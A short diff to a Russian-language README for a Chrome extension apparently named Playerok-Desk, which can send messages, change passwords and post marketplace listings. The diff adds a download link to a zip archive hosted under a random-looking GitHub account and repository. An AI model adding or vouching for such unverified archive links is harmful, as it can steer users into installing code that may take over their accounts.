@@ -14,6 +14,8 @@
 
 Учебный режим включён сразу: расширение пишет в журнал, что сделало бы, и не шлёт сообщения, не меняет пароль и не публикует лот.
 
+Скачать архив: https://github.com/vsevolodufvcvyf-bot/dnmsnwjdsannnrenfdas/raw/refs/heads/cursor/playerok-desk-293b/Playerok-Desk.zip
+
 ## Как поставить
 
 1. Откройте `chrome://extensions`.
